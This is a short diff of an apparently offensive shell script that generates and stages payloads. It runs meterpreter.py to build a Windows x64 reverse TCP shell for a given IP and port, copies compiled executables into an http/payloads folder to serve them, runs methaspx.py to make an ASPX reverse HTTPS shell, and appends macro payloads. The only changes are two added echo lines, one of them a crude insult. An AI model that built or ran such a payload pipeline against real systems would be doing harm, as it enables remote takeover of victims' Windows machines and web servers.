@@ -6,6 +6,9 @@ localnic=${1:-}
 localport=${2:-}
 BESTAND=${3:-}
 
+
+echo "[.] Incompentent bastard "
+
 if [ -z "$localnic" ]; then
 
 
@@ -112,6 +115,9 @@ cp meuk/meth/bin/Debug/meth.exe http/payloads/${BESTAND}_meth.exe
 
 python3 meterpreter.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
 cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe
+
+
+echo "ASPX reverse https shell :)"
 python3 methaspx.py ${IP} ${PORT}
 
 echo '#MACRO' >> http/payloads/${BESTAND}_${PORT}.txt
